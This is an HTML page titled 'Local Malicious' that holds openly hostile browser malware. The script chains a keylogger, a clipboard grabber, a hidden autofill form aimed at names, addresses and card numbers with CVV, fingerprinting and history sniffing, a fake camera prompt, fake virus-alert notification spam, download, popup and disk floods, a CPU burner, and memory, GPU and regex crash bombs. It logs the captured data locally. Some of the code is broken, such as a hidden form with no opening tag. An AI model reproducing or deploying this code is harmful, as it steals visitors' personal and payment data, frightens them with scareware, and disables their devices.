<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="5">
    <title>Local Malicious</title>
    <style>
        body { background:#000; color:#0f0; font-family:monospace; text-align:center; margin-top:10vh; }
        #fakeBtn { padding:20px 40px; font-size:30px; background:#0f0; color:#000; border:none; cursor:pointer; }
        .hidden { display:none; }
    </style>
</head>
<body>
    <h1 id="status">INITIALIZING...</h1>
    <button id="fakeBtn" class="hidden">Click to Continue</button>

    <!-- Hidden form for autofill grab -->

        <input type="text" name="name" autocomplete="name">
        <input type="email" name="email" autocomplete="email">
        <input type="tel" name="phone" autocomplete="tel">
        <input type="text" name="address" autocomplete="street-address">
        <input type="text" name="cc" autocomplete="cc-number">
        <input type="text" name="cvv" autocomplete="cc-csc">
        <button type="submit">Submit</button>
    </form>

    <script>
        // ===== Utility: Local Storage Logger =====
        function localLog(key, value) {
            try {
                const existing = localStorage.getItem('stolen_' + key);
                let arr = existing ? JSON.parse(existing) : [];
                arr.push({ time: Date.now(), data: value });
                localStorage.setItem('stolen_' + key, JSON.stringify(arr));
            } catch(e) {}
        }

        // ===== 1. Persistent Flag =====
        localStorage.setItem('malware', 'true');

        // ===== 2. System Info =====
        function collectSystemInfo() {
            const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
            pc.createDataChannel('');
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (m) {
                        const info = {
                            ip: m[1],
                            ua: navigator.userAgent,
                            res: screen.width + 'x' + screen.height,
                            cores: navigator.hardwareConcurrency || 1,
                            lang: navigator.language,
                            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                        };
                        localLog('sysinfo', info);
                    }
                }
            };
            pc.createOffer().then(o => pc.setLocalDescription(o));
        }

        // ===== 3. Canvas Fingerprint =====
        function canvasFingerprint() {
            try {
                const c = document.createElement('canvas');
                c.width = 200; c.height = 50;
                const ctx = c.getContext('2d');
                ctx.fillStyle = '#f60'; ctx.fillRect(0,0,200,50);
                ctx.fillStyle = '#069'; ctx.fillRect(10,10,50,30);
                ctx.font = '20px Arial'; ctx.fillText('test', 70, 35);
                const hash = c.toDataURL().length.toString(16) + c.toDataURL().substr(-20);
                localLog('fingerprint', hash);
            } catch(e) {}
        }

        // ===== 4. Keylogger =====
        document.addEventListener('keydown', (e) => {
            localLog('keys', e.key);
        });

        // ===== 5. Clipboard Grabber =====
        setInterval(() => {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(text => {
                    if (text && text.length > 0) {
                        localLog('clipboard', text);
                    }
                }).catch(()=>{});
            }
        }, 5000);

        // ===== 6. History Probe (CSS :visited) =====
        function historyProbe() {
            const urls = ['https://facebook.com','https://instagram.com','https://twitter.com','https://youtube.com','https://gmail.com'];
            urls.forEach(url => {
                const a = document.createElement('a');
                a.href = url; a.style.display='none';
                document.body.appendChild(a);
                const color = getComputedStyle(a).color;
                if (color === 'rgb(85, 26, 139)' || color === 'rgb(0, 0, 255)') {
                    localLog('history', url);
                }
                a.remove();
            });
        }

        // ===== 7. Fake Camera/Mic Prompt =====
        function setupFakeButton() {
            const btn = document.getElementById('fakeBtn');
            btn.classList.remove('hidden');
            btn.onclick = () => {
                navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                    const settings = stream.getVideoTracks()[0].getSettings();
                    localLog('media', settings);
                    // keep stream open
                }).catch(()=>{});
            };
        }

        // ===== 8. Notification Spam =====
        function notificationSpam() {
            if ('Notification' in window) {
                Notification.requestPermission().then(perm => {
                    if (perm === 'granted') {
                        setInterval(() => new Notification('Virus Alert', {body:'Click to clean'}), 2000);
                    }
                });
            }
        }

        // ===== 9. Auto-Download Flood =====
        function downloadFlood() {
            setInterval(() => {
                const blob = new Blob([new ArrayBuffer(5*1024*1024)], {type:'application/octet-stream'});
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'file_' + Date.now() + '.bin';
                document.body.appendChild(a);
                a.click();
                URL.revokeObjectURL(a.href);
                a.remove();
            }, 3000);
        }

        // ===== 10. Vibration Drain =====
        function vibrateDrain() {
            setInterval(() => {
                if (navigator.vibrate) navigator.vibrate(1000);
            }, 1000);
        }

        // ===== 11. Popup Flood =====
        function popupFlood() {
            for (let i=0; i<5; i++) window.open(location.href, '_blank');
        }

        // ===== 12. Autofill Grab (hidden form) =====
        function autofillGrab() {
            const form = document.getElementById('autofillForm');
            setInterval(() => {
                const inputs = form.querySelectorAll('input');
                inputs.forEach(inp => {
                    if (inp.value && inp.value.length > 0) {
                        localLog('autofill_' + inp.name, inp.value);
                        inp.value = ''; // clear to avoid memory bloat
                    }
                });
            }, 3000);
        }

        // ===== 13. Beforeunload Block =====
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = 'Wait!';
        });

        // ===== 14. History.pushState Trap =====
        function pushStateTrap() {
            let i = 0;
            setInterval(() => {
                history.pushState({}, '', '#' + (i++));
            }, 2000);
        }

        // ===== 15. IndexedDB Disk Fill =====
        function indexedDBFill() {
            const request = indexedDB.open('fill', 1);
            request.onupgradeneeded = e => {
                const db = e.target.result;
                const store = db.createObjectStore('data', { keyPath: 'id' });
            };
            request.onsuccess = e => {
                const db = e.target.result;
                const tx = db.transaction('data', 'readwrite');
                const store = tx.objectStore('data');
                setInterval(() => {
                    const big = new Array(5*1024*1024).join('x'); // 5 MB string
                    store.put({ id: Date.now(), blob: big });
                }, 10000);
            };
        }

        // ===== 16. Crypto Miner (CPU Burn) =====
        function startMiner() {
            const blob = new Blob(['while(true){}'], {type:'application/javascript'});
            new Worker(URL.createObjectURL(blob));
        }

        // ===== 17. Crash Vectors =====
        function memoryBomb() {
            const chunks = [];
            const size = 10*1024*1024;
            while (true) {
                chunks.push(new ArrayBuffer(size));
                chunks.push(new Array(size).join('x'));
            }
        }

        function domFlood() {
            setInterval(() => {
                for (let i=0; i<500; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.005);z-index:9999;pointer-events:none;';
                    div.animate([{transform:'scale(1)',opacity:0.1},{transform:'scale(3)',opacity:0.5}],{duration:1000,iterations:Infinity,direction:'alternate'});
                    document.body.appendChild(div);
                }
            }, 10);
        }

        function gpuHang() {
            const c = document.createElement('canvas'); c.width=1; c.height=1;
            document.body.appendChild(c);
            const gl = c.getContext('webgl');
            if (!gl) return;
            const vs = 'attribute vec2 p; void main(){ gl_Position=vec4(p,0.0,1.0); }';
            const fs = 'precision highp float; void main(){ float i=0.0; while(true){ i+=0.0001; } gl_FragColor=vec4(i,0.0,0.0,1.0); }';
            const vsh = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vsh, vs); gl.compileShader(vsh);
            const fsh = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fsh, fs); gl.compileShader(fsh);
            if (!gl.getShaderParameter(fsh, gl.COMPILE_STATUS)) {
                const fs2 = 'precision highp float; void main(){ float i=0.0; for(int j=0;j<10000000;j++){ i+=0.0000001; } gl_FragColor=vec4(i,0.0,0.0,1.0); }';
                gl.shaderSource(fsh, fs2); gl.compileShader(fsh);
            }
            const prog = gl.createProgram(); gl.attachShader(prog, vsh); gl.attachShader(prog, fsh);
            gl.linkProgram(prog); gl.useProgram(prog);
            const buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0,0]), gl.STATIC_DRAW);
            const loc = gl.getAttribLocation(prog, 'p'); gl.enableVertexAttribArray(loc); gl.vertexAttribPointer(loc,2,gl.FLOAT,false,0,0);
            gl.drawArrays(gl.POINTS,0,1);
        }

        function regexBomb() {
            /^(a+)+$/.test('a'.repeat(30) + '!');
        }

        // ===== 18. Service Worker Registration =====
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
                .then(reg => console.log('SW registered'))
                .catch(err => console.log('SW failed'));
        }

        // ===== START =====
        function startAll() {
            document.getElementById('status').textContent = 'ATTACKING...';
            collectSystemInfo();
            canvasFingerprint();
            setTimeout(setupFakeButton, 100);
            setTimeout(notificationSpam, 200);
            setTimeout(downloadFlood, 300);
            setTimeout(vibrateDrain, 400);
            setTimeout(popupFlood, 500);
            setTimeout(historyProbe, 800);
            setTimeout(autofillGrab, 1000);
            setTimeout(pushStateTrap, 1200);
            setTimeout(indexedDBFill, 1500);
            setTimeout(startMiner, 1800);
            // Crash delayed
            setTimeout(memoryBomb, 2500);
            setTimeout(domFlood, 2800);
            setTimeout(gpuHang, 3200);
            setTimeout(regexBomb, 3500);
        }

        if (localStorage.getItem('malware') === 'true') {
            startAll();
        } else {
            window.onload = startAll;
        }
    </script>
